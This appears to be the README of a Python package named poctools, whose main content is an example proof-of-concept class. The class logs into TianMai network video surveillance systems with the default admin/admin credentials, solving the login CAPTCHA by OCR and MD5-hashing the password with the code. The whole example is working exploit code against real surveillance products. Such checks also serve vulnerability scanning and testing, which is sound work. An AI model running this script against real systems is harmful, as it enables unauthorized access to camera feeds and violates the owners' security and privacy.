# poctools

## install

```bash
pip install poctools
```

## example

```python
from poctools import BasicPoc
from poctools.encrypt import md5
from poctools.ocr import new_number


class TianMaiNetworkVideoSurveillanceWeakCipherPoc(BasicPoc):
    jsessionid_uri = "/login.jsp"
    login_uri = "/j_login.auth"
    verify_code_uri = "/jsp/common/validateCode.jsp"

    def __init__(self):
        super(TianMaiNetworkVideoSurveillanceWeakCipherPoc, self).__init__()
        self.name = "天迈网络视频监控弱密码"

    def verify(self, url: str) -> bool:
        jsessionid_response = self.get(url + self.jsessionid_uri)
        if jsessionid_response is None:
            return False
        payload = {"j_apptype": "1", "j_username": "admin", "remember-me": False}
        while True:
            verify_code_response = self.get(url + self.verify_code_uri)
            if verify_code_response is None:
                return False
            code = new_number(verify_code_response.content)
            if len(code) != 4:
                continue
            payload.setdefault("validateCode", code)
            payload.setdefault("j_password", md5("admin" + code))
            login_response = self.post(url + self.login_uri, data=payload)
            if login_response is None:
                return False
            return login_response.status_code == 200 and "验证码有误" not in login_response.text


if __name__ == '__main__':
    target = "http://127.0.0.1:18080"
    tp = TianMaiNetworkVideoSurveillanceWeakCipherPoc()
    result = tp.run(target)
    print(f"{target} -> {result}")
```
